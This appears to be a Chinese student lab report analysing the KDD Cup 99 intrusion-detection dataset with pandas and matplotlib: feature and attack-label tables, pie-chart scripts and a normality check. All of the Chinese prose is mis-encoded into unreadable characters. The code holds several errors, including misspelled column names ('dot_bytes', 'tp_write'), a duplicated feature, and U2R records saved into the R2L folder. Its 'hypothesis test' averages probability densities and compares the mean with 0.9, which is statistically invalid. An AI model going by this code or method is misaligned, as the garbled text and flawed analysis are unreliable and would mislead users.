ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºçš„è¿æ¥æ•°                           | è¿ç»­ |\n| dst_host_srv_count          | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºç›¸åŒæœåŠ¡çš„è¿æ¥æ•°                   | è¿ç»­ |\n| dst_host_same_srv_rate      | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºç›¸åŒæœåŠ¡çš„è¿æ¥æ‰€å çš„ç™¾åˆ†æ¯”         | è¿ç»­ |\n| dst_host_diff_srv_rate      | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºä¸åŒæœåŠ¡çš„è¿æ¥æ‰€å çš„ç™¾åˆ†æ¯”         | è¿ç»­ |\n| dst_host_same_src_port_rate | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºç›¸åŒæºç«¯å£çš„è¿æ¥æ‰€å çš„ç™¾åˆ†æ¯”       | è¿ç»­ |\n| dst_host_srv_diff_host_rate | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºç›¸åŒæœåŠ¡çš„è¿æ¥ä¸­ï¼Œä¸å½“å‰è¿æ¥å…·æœ‰ä¸åŒæºä¸»æœºçš„è¿æ¥æ‰€å çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| dst_host_serror_rate        | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºçš„è¿æ¥ä¸­ï¼Œå‡ºç°\"**SYN**\"é”™è¯¯çš„è¿æ¥æ‰€å çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| dst_host_srv_serror_rate    | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºç›¸åŒæœåŠ¡çš„è¿æ¥ä¸­ï¼Œå‡ºç°\"**SYN**\"é”™è¯¯çš„è¿æ¥æ‰€å çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| dst_host_rerror_rate        | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºçš„è¿æ¥ä¸­ï¼Œå‡ºç°\"**REJ**\"é”™è¯¯çš„è¿æ¥æ‰€å çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n| dst_host_srv_rerror_rate    | ä¸å½“å‰è¿æ¥å…·æœ‰ç›¸åŒç›®æ ‡ä¸»æœºç›¸åŒæœåŠ¡çš„è¿æ¥ä¸­ï¼Œå‡ºç°\"**REJ**\"é”™è¯¯çš„è¿æ¥æ‰€å çš„ç™¾åˆ†æ¯” | è¿ç»­ |\n\nç¬¬42é¡¹\n\n| æ ‡è¯†ç±»å‹ | æè¿°                                 | å…·ä½“åˆ†ç±»æ ‡è¯†                                                 |\n| -------- | ------------------------------------ | ------------------------------------------------------------ |\n| Normal   | æ­£å¸¸è®°å½•                             | Normal                                                       |\n| DOS      | æ‹’ç»æœåŠ¡æ”»å‡»                         | backã€landã€neptuneã€podã€smurfã€teardropã€apache2ã€mailbombã€processtableã€udpstorm |\n| Probing  | ç›‘è§†å’Œå…¶ä»–æ¢                         | ipsweepã€nmapã€portsweepã€satanã€mscanã€saint                |\n| R2L      | æ¥è‡ªè¿œç¨‹æœºå™¨çš„éæ³•è®¿é—®               | tp_writeã€guess_passwdã€imapã€multihopã€phfã€spyã€warezclientã€warezmasterã€multihopã€namedã€sendmailã€snmpgetattackã€wormã€xlockã€xsnoop |\n| U2R      | æ™®é€šç”¨æˆ·å¯¹æœ¬åœ°è¶…çº§ç”¨æˆ·ç‰¹æƒçš„éæ³•è®¿é—® | buffer_overflowã€loadmoduleã€perlã€rootkitã€psã€sqlattackã€xtermã€httptunnel |\n\n### å®éªŒç»“æœ\n\n#### **1.å¯¹â€œkddcup.data_10_percentâ€æ•°æ®é›†ï¼ˆwith labelï¼‰è¿›è¡Œå¤„ç†ï¼Œè·å¾—ç»Ÿè®¡ä¿¡æ¯**\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # æ„é€ å›¾ä¾‹æ•°æ®\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # ä½¿å¾—åˆ°çš„å›¾ç‰‡æ›´å®Œæ•´æ¸…æ™°\n\ndef plot_label(title, font_size):\n    df_label = df.loc[:, title].value_counts()\n    dict_value = {}\n    for i in df_label.keys():\n        dict_value[i] = df_label[i]\n    plot_pie_optimize(title, dict_value, font_size)\n\n\nplot_label(\"label\", 5)\nplot_label(\"flag\", 6)\nplot_label(\"protocol_type\", 6)\n```\n\nå±•ç¤ºéƒ¨åˆ†æ•°æ®\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291140247.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291147335.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291147296.png)\n\n#### **2.å¯¹â€œkddcup.testdata.unlabeledâ€æ•°æ®é›†è¿›è¡Œå¤„ç†ï¼Œè·å¾—ç»Ÿè®¡ä¿¡æ¯**\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/kddcup.data.corrected-The full data set\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # æ„é€ å›¾ä¾‹æ•°æ®\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # ä½¿å¾—åˆ°çš„å›¾ç‰‡æ›´å®Œæ•´æ¸…æ™°\n\ndef plot_label(title, font_size):\n    df_label = df.loc[:, title].value_counts()\n    dict_value = {}\n    for i in df_label.keys():\n        dict_value[i] = df_label[i]\n    plot_pie_optimize(title, dict_value, font_size)\n\n\nplot_label(\"label\", 5)\nplot_label(\"flag\", 6)\nplot_label(\"protocol_type\", 6)\n\n```\n\nå±•ç¤ºéƒ¨åˆ†æ•°æ®\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291149430.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291149133.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291149235.png)\n\n#### **3.æ ¹æ®â€œkddcup.data_10_percentâ€æ•°æ®é›†ï¼ˆwith labelï¼‰ åˆ†å‡ºä¸åŒç§ç±»çš„æ”»å‡»å’Œæ­£å¸¸æ•°æ®ï¼Œè·å¾—åŸºæœ¬çš„ç»Ÿè®¡ä¿¡æ¯**\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # æ„é€ å›¾ä¾‹æ•°æ®\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # ä½¿å¾—åˆ°çš„å›¾ç‰‡æ›´å®Œæ•´æ¸…æ™°\n\n\nnormal_label = ['normal']\ndos_label = ['back','land','neptune','pod','smurf','teardrop','apache2','mailbomb','processtable','udpstorm']\nprobing_label = ['ipsweep','nmap','portsweep','satan','mscan','saint']\nr2l_label = ['tp_write','guess_passwd','imap','multihop','phf','spy','warezclient','warezmaster','multihop','named','sendmail','snmpgetattack','worm','xlock','xsnoop']\nu2r_label = ['buffer_overflow','loadmodule','perl','rootkit','ps','sqlattack','xterm','httptunnel']\n\nfinal_label = ['Normal','Dos','Probing','R2l','U2r']\nfinal_dict = {\n    \"Normal\": 0,\n    \"Dos\": 0,\n    \"Probing\": 0,\n    \"R2l\": 0,\n    \"U2r\": 0\n}\n\nfor i in normal_label:\n    final_dict[\"Normal\"] += df[df.values == i + '.'].__len__()\n\nfor i in dos_label:\n    final_dict[\"Dos\"] += df[df.values == i + '.'].__len__()\n\nfor i in probing_label:\n    final_dict[\"Probing\"] += df[df.values == i + '.'].__len__()\n\nfor i in r2l_label:\n    final_dict[\"R2l\"] += df[df.values == i + '.'].__len__()\n\nfor i in u2r_label:\n    final_dict[\"U2r\"] += df[df.values == i + '.'].__len__()\n\nplot_pie_optimize(\"Attack data\", final_dict, 8)\n\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291222924.png)\n\n#### 4.åˆ©â½¤labeledæ•°æ®é›†çš„ç»Ÿè®¡ç‰¹å¾ï¼Œåˆ†æunlabeledæ•°æ®é›†ã€‚å‡è®¾KDD99çš„æ­£å¸¸æ•°æ®é›†æœä»æ­£æ€åˆ†å¸ƒï¼Œåˆ™åœ¨ç½®ä¿¡åº¦ä¸º0.9çš„æƒ…å†µä¸‹ï¼Œè¯·æ£€éªŒunlabeledæ•°æ®é›†æ˜¯å¦å±äºæ­£å¸¸æ•°æ®ï¼Ÿ\n\n**æç¤ºï¼šé¦–å…ˆéœ€è¦è·å¾—ä¸€ä¸ªnormalçš„æ•°æ®æ ·æœ¬é›†ï¼Œç„¶åéœ€è¦æ’é™¤æ‰æ•°æ®é›†ä¸­æ— å…³featuresçš„å½±å“ï¼Œä¹‹åä»¥å¤„ç†åçš„æ•°æ®é›†ä¼°è®¡KDD99æ­£å¸¸æ•°æ®é›†çš„å‡å€¼å’Œæ–¹å·®ï¼Œç„¶ååˆ©ç”¨å‡è®¾æ£€éªŒï¼Œå¯¹åº”çš„å»æ£€éªŒunlabeledæ•°æ®é›†çš„ç›¸å…³æ€§è´¨ã€‚**\n\n```python\nimport pandas as pd\nimport numpy as np\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf1 = pd.read_csv(\"./data/kddcup.data.corrected-The full data set\")\ndf.columns = labels\ndf1.columns = labels\n\nnormal_label = ['normal']\ndos_label = ['back','land','neptune','pod','smurf','teardrop','apache2','mailbomb','processtable','udpstorm']\nprobing_label = ['ipsweep','nmap','portsweep','satan','mscan','saint']\nr2l_label = ['tp_write','guess_passwd','imap','multihop','phf','spy','warezclient','warezmaster','multihop','named','sendmail','snmpgetattack','worm','xlock','xsnoop']\nu2r_label = ['buffer_overflow','loadmodule','perl','rootkit','ps','sqlattack','xterm','httptunnel']\n\nfinal_label = ['Normal','Dos','Probing','R2l','U2r']\nfinal_dict = {\n    \"Normal\": 0,\n    \"Dos\": 0,\n    \"Probing\": 0,\n    \"R2l\": 0,\n    \"U2r\": 0\n}\n\nfor i in normal_label:\n    df[df.values == i +'.'].to_csv('./label/normal/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/normal/'+ i +'.csv', header=0, index=0)\n\nfor i in dos_label:\n    df[df.values == i +'.'].to_csv('./label/dos/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/dos/'+ i +'.csv', header=0, index=0)\n\nfor i in probing_label:\n    df[df.values == i +'.'].to_csv('./label/probing/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/probing/'+ i +'.csv', header=0, index=0)\n\nfor i in r2l_label:\n    df[df.values == i +'.'].to_csv('./label/r2l/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/r2l/'+ i +'.csv', header=0, index=0)\n\nfor i in u2r_label:\n    df[df.values == i +'.'].to_csv('./label/u2r/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/r2l/'+ i +'.csv', header=0, index=0)\n```\n\nå…ˆè·å¾—å„ç§ä¸åŒç§ç±»çš„æ•°æ®\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291544707.png)\n\n```python\nimport pandas as pd\nimport numpy as np\nfrom scipy.stats import norm\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./label/normal/normal.csv\")\ndf1 = pd.read_csv(\"./label1/normal/normal.csv\")\ndf.columns = labels\ndf1.columns = labels\n\n# é€‰æ‹©è¦åˆ†æçš„ç‰¹å¾\nfeature = \"duration\"\n\n# è®¡ç®— labeled æ•°æ®é›†ä¸­ç‰¹å¾çš„å‡å€¼å’Œæ ‡å‡†å·®\nmean = df[feature].mean()\nstd = df[feature].std()\n\n# åˆå§‹åŒ–æ¦‚ç‡å’Œè®¡æ•°å™¨\nprobability_sum = 0\ncount = 0\n\n# éå† unlabeled æ•°æ®é›†ä¸­çš„æ¯ä¸ªæ•°æ®ç‚¹\nfor value in df1[feature]:\n  # è®¡ç®—æ•°æ®ç‚¹åœ¨å‡è®¾æ­£å¸¸æ•°æ®æœä»æ­£æ€åˆ†å¸ƒçš„æƒ…å†µä¸‹çš„æ¦‚ç‡\n  probability = norm.pdf(value, mean, std)\n  # ç´¯åŠ æ¦‚ç‡å’Œè®¡æ•°å™¨\n  probability_sum += probability\n  count += 1\n\n# è®¡ç®—å¹³å‡æ¦‚ç‡\nmean_probability = probability_sum / count\nprint(mean_probability)\n# å°†å¹³å‡æ¦‚ç‡ä¸æ‰€éœ€çš„ç½®ä¿¡åº¦è¿›è¡Œæ¯”è¾ƒ\nif mean_probability > 0.9:\n  print(\"Unlabeled dataset is likely to belong to normal data.\")\nelse:\n  print(\"Unlabeled dataset is not likely to belong to normal data.\")\n```\n\n> 0.0007079938317307032\n> Unlabeled dataset is not likely to belong to normal data.\n\n\n\n## äº”ã€å®éªŒè¿‡ç¨‹\n\n### å¤„ç†æ•°æ®\n\nå‚è€ƒèœé¸Ÿæ•™ç¨‹çš„ç¤ºä¾‹ï¼Œå¯å‘ç°**pandasåº“**å¯¹csvï¼Œä¹Ÿå°±æ˜¯æœ¬å®éªŒç»™å‡ºçš„æ•°æ®æ˜¯å¾ˆå¥½å¤„ç†çš„\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291052328.png)\n\n```python\nimport pandas as pd\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"test.txt\")\ndf.columns = labels\ndf_dict = df.loc[:,\"duration\"].value_counts()\n```\n\nä»è€Œæ ¹æ®æ¡ˆä¾‹ç¼–å†™å‡ºå¦‚ä¸‹ä»£ç ï¼Œå¯ä»¥å¾—åˆ°**duration**è¡Œçš„ç»Ÿè®¡æ•°æ®\n\n```\n0    6\n1    4\n2    2\nName: duration, dtype: int64\n```\n\nå¯¹å…¶è¿›è¡Œç®€å•å¤„ç†\n\n```python\ndict = {}\nfor i in df_dict.keys():\n    dict[i] = df_dict[i]\nkeys = np.array(list(dict.keys()))\nvalues = np.array(list(dict.values()))\n```\n\nå¯ä»¥å¾—åˆ°\n\n```\nkeys: [0, 1, 2]\nvalues: [6 4 2]\n```\n\næ­£å¥½æ»¡è¶³ **Matplotlib** ç»˜åˆ¶é¥¼å›¾éœ€è¦çš„æ•°æ®\n\n### Matplotlib é¥¼å›¾\n\næ ¹æ®èœé¸Ÿæ•™ç¨‹ä»¥ä¸‹ä»£ç ï¼Œå¯å¾—åˆ°\n\n```python\nimport matplotlib.pyplot as plt\nimport numpy as np\n\ny = np.array([35, 25, 25, 15])\n\nplt.pie(y,\n        labels=['A','B','C','D'], # è®¾ç½®é¥¼å›¾æ ‡ç­¾\n        colors=[\"#d5695d\", \"#5d8ca8\", \"#65a479\", \"#a564c9\"], # è®¾ç½®é¥¼å›¾é¢œè‰²\n       )\nplt.title(\"RUNOOB Pie Test\") # è®¾ç½®æ ‡é¢˜\nplt.show()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142167.png)\n\nåœ¨ä¸Šé¢å¯¹æµ‹è¯•æ•°æ®çš„å¤„ç†ä¸‹å¯¹è¯¥ä»£ç è¿›è¡Œæ”¹å˜å¯å¾—åˆ°\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"test.txt\")\ndf.columns = labels\ndf_dict = df.loc[:,\"duration\"].value_counts()\ndict = {}\nfor i in df_dict.keys():\n    dict[i] = df_dict[i]\nkeys = np.array(list(dict.keys()))\nvalues = np.array(list(dict.values()))\ny = values\n\nplt.pie(y,\n        labels=np.array(keys), # è®¾ç½®é¥¼å›¾æ ‡ç­¾\n        colors=[\"#d5695d\", \"#5d8ca8\", \"#65a479\"], # è®¾ç½®é¥¼å›¾é¢œè‰²\n       )\nplt.title(\"Duration Pie Test\") # è®¾ç½®æ ‡é¢˜\nplt.show()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142290.png)\n\nè€Œç”±äºæœ¬é¢˜ä¸­çš„æ•°æ®è¿‡å¤šè¿‡æ‚ï¼Œå°†æ•°æ®åç§°æ˜¾ç¤ºåœ¨æ¯ä¸ªæ‰‡å½¢çš„æ—è¾¹æ˜¯ä¸ç°å®çš„ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå›¾ä¾‹å®ç°å¦‚ä¸‹æ•ˆæœ\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142994.png)\n\nå‚è€ƒ\thttps://blog.csdn.net/weixin_35757704/article/details/126965333\n\næ ¹æ®å…¶ä»£ç ï¼Œå¯å¾—åˆ°\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"test.txt\")\ndf.columns = labels\ndf_dict = df.loc[:,\"duration\"].value_counts()\ndict_value = {}\nfor i in df_dict.keys():\n    dict_value[i] = df_dict[i]\nkeys = list(dict_value.keys())\nvalues = np.array(list(dict_value.values()))\npatches, texts = plt.pie(values)\nlabels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n    zip(keys, 100. * values / values.sum(), values)]  # æ„é€ å›¾ä¾‹æ•°æ®\npatches, labels, dummy = zip(*sorted(\n    zip(patches, labels, values), key=lambda x: x[2], reverse=True))\nplt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=8)\nplt.tight_layout()\nplt.show()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142469.png)\n\nå°†å…¶æ•´åˆä¸ºä¸¤ä¸ªå‡½æ•°å¹¶ç¨å¾®æ”¹è¿›\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # æ„é€ å›¾ä¾‹æ•°æ®\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # ä½¿å¾—åˆ°çš„å›¾ç‰‡æ›´å®Œæ•´æ¸…æ™°\n\ndef plot_label(title, font_size):\n    df_label = df.loc[:, title].value_counts()\n    dict_value = {}\n    for i in df_label.keys():\n        dict_value[i] = df_label[i]\n    plot_pie_optimize(title, dict_value, font_size)\n\n\nplot_label(\"flag\", 6)\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291140247.png)\n\n## 